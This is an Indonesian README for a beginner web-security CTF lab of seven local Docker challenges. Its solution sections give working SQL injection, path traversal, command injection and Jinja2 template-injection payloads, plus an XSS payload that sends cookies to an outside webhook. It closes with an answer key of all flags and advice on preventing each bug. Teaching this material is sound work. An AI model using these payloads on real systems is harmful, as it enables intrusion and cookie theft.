# 🏴‍☠️ CTF Bootcamp - Web Security Challenges

Kumpulan soal CTF untuk pemula yang mencakup vulnerabilitas web security dasar.

## 📋 Daftar Challenge

| No | Challenge | Port | Difficulty | Vulnerability |
|----|-----------|------|------------|---------------|
| 1 | SecureBank Login | 10101 | Easy | SQL Injection |
| 2 | DocReader Pro | 10102 | Easy | Local File Inclusion (LFI) |
| 3 | ImageGallery | 10103 | Easy | Local File Disclosure (LFD) |
| 4 | ServerPing Tool | 10104 | Easy | Remote Code Execution (RCE) |
| 5 | GreetingCard Generator | 10105 | Easy | Server Side Template Injection (SSTI) |
| 6 | FeedbackHub | 10106 | Medium | Cross-Site Scripting (XSS) + Cookie Stealing |
| 7 | CorpPortal | 10107 | Easy | Mass Assignment / Privilege Escalation |

## 🚀 Cara Menjalankan

### Prasyarat
- Docker
- Docker Compose

### Jalankan Semua Challenge

```bash
# Build dan jalankan semua container
docker-compose up -d --build

# Lihat status container
docker-compose ps

# Stop semua container
docker-compose down
```

### Akses Challenge

Setelah container berjalan, akses masing-masing challenge di browser:

- **SQL Injection**: http://localhost:10101
- **LFI**: http://localhost:10102
- **LFD**: http://localhost:10103
- **RCE**: http://localhost:10104
- **SSTI**: http://localhost:10105
- **XSS**: http://localhost:10106
- **Mass Assignment**: http://localhost:10107

---

## 📚 Detail Challenge

### Challenge 1: SQL Injection (Port 10101)
**SecureBank Login**

Sebuah form login yang rentan terhadap SQL Injection. Tujuan: bypass autentikasi dan dapatkan flag sebagai admin.

<details>
<summary>💡 Hint</summary>

- Coba masukkan karakter spesial seperti `'` di field username
- SQL query kemungkinan: `SELECT * FROM users WHERE username = 'INPUT' AND password = 'INPUT'`
- Bagaimana jika kita bisa membuat kondisi selalu TRUE?

</details>

<details>
<summary>🔑 Solution</summary>

**Payload Username:**
```
admin' OR '1'='1' --
```

**Atau:**
```
' OR 1=1 --
```

**Flag:** `CyberJateng{sql_1nj3ct10n_m4st3r_2026}`

</details>

---

### Challenge 2: Local File Inclusion - LFI (Port 10102)
**DocReader Pro**

Aplikasi documentation viewer yang memuat halaman secara dinamis. Tujuan: baca file `/flag.txt` dari sistem.

<details>
<summary>💡 Hint</summary>

- Perhatikan URL parameter `?page=home`
- Aplikasi menambahkan ekstensi `.php` secara otomatis
- Gunakan path traversal `../` untuk keluar dari direktori

</details>

<details>
<summary>🔑 Solution</summary>

**Payload URL:**
```
http://localhost:10102/?page=../../../../flag.txt
```

**Atau:**
```
http://localhost:10102/?page=../../../flag.txt
```

**Flag:** `CyberJateng{l0c4l_f1l3_1nclus10n_pwn3d}`

</details>

---

### Challenge 3: Local File Disclosure - LFD (Port 10103)
**ImageGallery**

Gallery sederhana yang membaca dan menampilkan isi file. Tujuan: baca file `/flag.txt`.

<details>
<summary>💡 Hint</summary>

- Perhatikan parameter `?file=images/sunset.txt`
- Aplikasi membaca file apapun yang diberikan
- Tidak ada validasi path, coba baca file sistem

</details>

<details>
<summary>🔑 Solution</summary>

**Payload URL:**
```
http://localhost:10103/?file=/flag.txt
```

**Bonus - baca file sistem:**
```
http://localhost:10103/?file=/etc/passwd
```

**Flag:** `CyberJateng{f1l3_d1scl0sur3_1s_d4ng3r0us}`

</details>

---

### Challenge 4: Remote Code Execution - RCE (Port 10104)
**ServerPing Tool**

Tool ping yang menjalankan command shell. Tujuan: eksekusi command untuk membaca `/flag.txt`.

<details>
<summary>💡 Hint</summary>

- Aplikasi menjalankan `ping -c 3 [INPUT]`
- Gunakan command separator untuk chain command
- Separator yang bisa dicoba: `;`, `|`, `&&`, `||`

</details>

<details>
<summary>🔑 Solution</summary>

**Payload di input field:**
```
8.8.8.8; cat /flag.txt
```

**Alternatif:**
```
127.0.0.1 | cat /flag.txt
127.0.0.1 && cat /flag.txt
; cat /flag.txt
```

**Bonus - eksekusi command lain:**
```
; ls -la /
; id
; whoami
```

**Flag:** `CyberJateng{r3m0t3_c0d3_3x3cut10n_1s_cr1t1c4l}`

</details>

---

### Challenge 5: Server Side Template Injection - SSTI (Port 10105)
**GreetingCard Generator**

Aplikasi greeting card yang menggunakan Jinja2 template engine. Tujuan: eksploitasi SSTI untuk membaca `/flag.txt`.

<details>
<summary>💡 Hint</summary>

- Aplikasi menggunakan Flask dengan Jinja2 template
- Input user langsung dirender ke dalam template
- Coba masukkan `{{7*7}}` untuk test SSTI

</details>

<details>
<summary>🔑 Solution</summary>

**Test SSTI:**
```
{{7*7}}
```
Jika output menampilkan `49`, SSTI confirmed!

**Payload untuk baca flag:**
```
{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}
```

**Payload alternatif:**
```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}
```

**Payload simpel (Python 3):**
```
{{''.__class__.__mro__[1].__subclasses__()[287]('cat /flag.txt',shell=True,stdout=-1).communicate()[0]}}
```

**Flag:** `CyberJateng{sst1_t3mpl4t3_1nj3ct10n_g0t_y0u}`

</details>

---

### Challenge 6: Cross-Site Scripting - XSS (Port 10106)
**FeedbackHub**

Aplikasi feedback yang rentan XSS. Admin bot mengunjungi link yang dilaporkan dengan cookie berisi flag.

<details>
<summary>💡 Hint</summary>

- Submit feedback dengan XSS payload
- Gunakan webhook/requestbin untuk menangkap cookie
- Report URL feedback ke admin melalui `/report.php`
- Admin memiliki cookie `admin_session` yang berisi flag

</details>

<details>
<summary>🔑 Solution</summary>

**Step 1:** Buat webhook di https://webhook.site atau https://requestbin.com

**Step 2:** Submit feedback dengan XSS payload:
```html
<script>fetch('https://YOUR-WEBHOOK-URL/?c='+document.cookie)</script>
```

Atau:
```html
<img src=x onerror="fetch('https://YOUR-WEBHOOK-URL/?c='+document.cookie)">
```

**Step 3:** Setelah feedback disubmit, pergi ke `/report.php` dan submit URL:
```
http://localhost/
```

**Step 4:** Tunggu beberapa detik, admin bot akan mengunjungi dan cookie akan dikirim ke webhook.

**Flag:** `CyberJateng{x55_c00k13_st34l3r_succ3ss}`

</details>

---

### Challenge 7: Mass Assignment / Privilege Escalation (Port 10107)
**CorpPortal**

Aplikasi employee portal dengan fitur registrasi. Tujuan: register sebagai admin untuk melihat flag.

<details>
<summary>💡 Hint</summary>

- Lihat source code form register (Inspect Element)
- Ada hidden field `role` dengan value `user`
- Apa yang terjadi jika kita ubah value-nya?
- Cek debug info di halaman register

</details>

<details>
<summary>🔑 Solution</summary>

**Method 1: Edit HTML dengan DevTools**
1. Buka halaman register
2. Inspect element pada form
3. Cari `<input type="hidden" name="role" value="user">`
4. Ubah `value="user"` menjadi `value="admin"`
5. Submit form registrasi

**Method 2: Menggunakan curl**
```bash
curl -X POST http://localhost:10107/register.php \
  -d "username=hacker&email=hacker@test.com&password=password123&role=admin"
```

**Method 3: Menggunakan Burp Suite**
1. Intercept request register
2. Tambahkan/ubah parameter `role=admin`
3. Forward request

**Step 2:** Login dengan akun yang baru dibuat

**Step 3:** Flag akan muncul di Admin Panel pada dashboard

**Flag:** `CyberJateng{m4ss_4ss1gnm3nt_pr1v1l3g3_3sc4l4t10n}`

</details>

---

## 🎯 Semua Flag

| Challenge | Flag |
|-----------|------|
| SQL Injection | `CyberJateng{sql_1nj3ct10n_m4st3r_2026}` |
| LFI | `CyberJateng{l0c4l_f1l3_1nclus10n_pwn3d}` |
| LFD | `CyberJateng{f1l3_d1scl0sur3_1s_d4ng3r0us}` |
| RCE | `CyberJateng{r3m0t3_c0d3_3x3cut10n_1s_cr1t1c4l}` |
| SSTI | `CyberJateng{sst1_t3mpl4t3_1nj3ct10n_g0t_y0u}` |
| XSS | `CyberJateng{x55_c00k13_st34l3r_succ3ss}` |
| Mass Assignment | `CyberJateng{m4ss_4ss1gnm3nt_pr1v1l3g3_3sc4l4t10n}` |

---

## 📖 Penjelasan Vulnerability

### SQL Injection
SQL Injection terjadi ketika input user langsung dimasukkan ke query SQL tanpa sanitasi. Penyerang dapat memanipulasi query untuk bypass autentikasi atau mengekstrak data.

**Cara Mencegah:**
- Gunakan Prepared Statements / Parameterized Queries
- Validasi dan sanitasi input
- Prinsip least privilege untuk database user

### Local File Inclusion (LFI)
LFI terjadi ketika aplikasi meng-include file berdasarkan input user tanpa validasi. Penyerang dapat membaca file sensitif atau bahkan mengeksekusi kode.

**Cara Mencegah:**
- Whitelist file yang boleh di-include
- Hindari menggunakan input user untuk path file
- Validasi dan sanitasi input

### Local File Disclosure (LFD)
Mirip dengan LFI, tapi fokus pada membaca/menampilkan isi file. Penyerang dapat membaca file konfigurasi, kredensial, atau file sensitif lainnya.

**Cara Mencegah:**
- Whitelist file yang boleh diakses
- Validasi path dan hindari path traversal
- Jangan expose file sistem ke user

### Remote Code Execution (RCE)
RCE adalah vulnerability paling berbahaya. Terjadi ketika input user dieksekusi sebagai command sistem. Penyerang mendapat kontrol penuh atas server.

**Cara Mencegah:**
- Jangan gunakan `shell_exec`, `exec`, `system`, `passthru` dengan input user
- Jika harus, gunakan escapeshellarg() dan escapeshellcmd()
- Whitelist input yang diperbolehkan

### Server Side Template Injection (SSTI)
SSTI terjadi ketika input user dirender langsung sebagai bagian dari template. Penyerang dapat mengeksekusi kode arbitrary di server.

**Cara Mencegah:**
- Jangan pernah memasukkan input user ke dalam template string
- Gunakan template engine dengan sandbox mode
- Validasi dan sanitasi input

### Cross-Site Scripting (XSS)
XSS terjadi ketika aplikasi menampilkan input user tanpa encoding yang tepat. Penyerang dapat mengeksekusi JavaScript di browser korban untuk mencuri cookie atau session.

**Cara Mencegah:**
- Selalu escape/encode output HTML
- Gunakan Content Security Policy (CSP)
- Set cookie dengan flag HttpOnly dan Secure

### Mass Assignment
Mass Assignment terjadi ketika aplikasi menerima semua parameter dari user dan langsung memasukkannya ke database. Penyerang dapat mengubah field yang seharusnya tidak bisa diubah (seperti role).

**Cara Mencegah:**
- Whitelist field yang boleh diisi user
- Jangan gunakan `$_POST` langsung untuk insert/update
- Validasi setiap field di server-side

---

## 🛠️ Troubleshooting

### Container tidak berjalan
```bash
# Cek log
docker-compose logs

# Cek log spesifik container
docker-compose logs xss

# Rebuild
docker-compose up -d --build --force-recreate
```

### Port sudah digunakan
Edit `docker-compose.yml` dan ubah port mapping sesuai kebutuhan.

### XSS Bot tidak berjalan
```bash
# Cek log bot
docker exec -it ctf-xss cat /var/log/bot.log

# Restart container
docker-compose restart xss
```

---

## 📝 License

Dibuat untuk tujuan edukasi CTF. Gunakan dengan bijak dan bertanggung jawab.

Happy Hacking! 🎉
